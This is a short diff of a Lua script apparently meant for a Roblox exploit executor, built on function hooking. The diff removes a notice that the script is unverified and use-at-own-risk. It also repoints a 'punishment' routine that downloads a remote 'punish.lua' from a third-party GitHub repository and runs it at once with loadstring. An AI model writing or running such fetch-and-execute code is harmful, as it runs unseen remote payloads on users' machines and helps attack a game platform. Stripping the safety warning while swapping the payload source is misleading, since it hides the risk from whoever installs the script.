@@ -1,6 +1,3 @@
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
 if getgenv().Loaded then return end
 getgenv().Loaded = true
 
@@ -18,7 +15,7 @@ local deb = false
 
 function punishment()
     if not deb then deb = true else return end
-    loadstring(game:HttpGet(("https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/punish.lua")))()
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/jayhubapis/ALL-SCRIPTS/main/punish.lua")))()
 end
 
 local realHookFunction = clonefunction(hookfunction)
